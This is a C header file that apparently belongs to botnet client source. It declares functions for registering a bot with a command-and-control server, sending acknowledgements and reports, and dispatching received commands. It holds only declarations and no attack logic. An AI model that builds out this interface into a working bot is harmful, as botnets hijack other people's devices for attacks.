#pragma once

#include "includes.h"
#include "protocol.h"

uint8_t cnc_get_bot_version(void);
bot_arch_t cnc_get_arch(void);
BOOL cnc_send_registration(int fd, const char *id);
BOOL cnc_send_ack(int fd, uint8_t ref_opcode, uint8_t status);
BOOL cnc_send_report(int fd, uint8_t type, const uint8_t *data, uint8_t data_len);
void cnc_dispatch(char *buf, int len);
